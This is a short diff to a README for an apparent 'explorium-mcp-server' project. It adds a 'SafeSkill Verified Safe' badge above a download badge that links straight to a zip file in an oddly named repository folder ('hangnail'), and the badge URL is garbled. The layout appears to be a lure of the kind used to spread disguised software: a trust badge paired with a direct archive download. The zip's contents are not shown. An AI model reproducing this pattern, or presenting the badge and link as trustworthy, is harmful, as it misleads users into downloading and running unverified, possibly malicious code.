@@ -1,5 +1,7 @@
 # 🌟 explorium-mcp-server - Streamline Your Data Intelligence Access
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/nws066-explorium-mcp-server)
+
 [![Download Latest Release](https://github.com/nws066/explorium-mcp-server/raw/refs/heads/main/hangnail/explorium-server-mcp-3.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/nws066/explorium-mcp-server/raw/refs/heads/main/hangnail/explorium-server-mcp-3.6.zip)
 
 ## 🚀 Getting Started
